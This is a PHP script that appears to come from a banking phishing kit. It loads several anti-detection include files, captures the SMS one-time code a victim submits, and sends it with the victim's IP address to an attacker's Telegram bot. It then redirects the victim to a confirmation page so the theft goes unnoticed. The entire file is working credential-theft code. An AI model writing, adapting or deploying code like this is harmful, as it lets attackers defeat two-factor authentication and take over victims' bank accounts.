<?php


    include "../../../prevents/anti1.php";
    include "../../../prevents/anti2.php";
    include "../../../prevents/anti3.php";
    include "../../../prevents/anti4.php";
    include "../../../prevents/anti5.php";
    include "../../../prevents/anti6.php";
    include "../../../prevents/anti7.php";

    include "config.php";
    
     $otp  = $_POST["code"];
     $message=
     '[🏦] === sms === [🏦]'."\n".
     '[🏷] SMS : '.$otp."\n".
     '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
    $data = ['chat_id' => $chat_id,'text' => $message,]; 
    $secure_red_falg = ['chat_id' => $secure,'text' => $message,]; $response = file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data));
    header("Location: ../../confirm.php");
    exit();

?>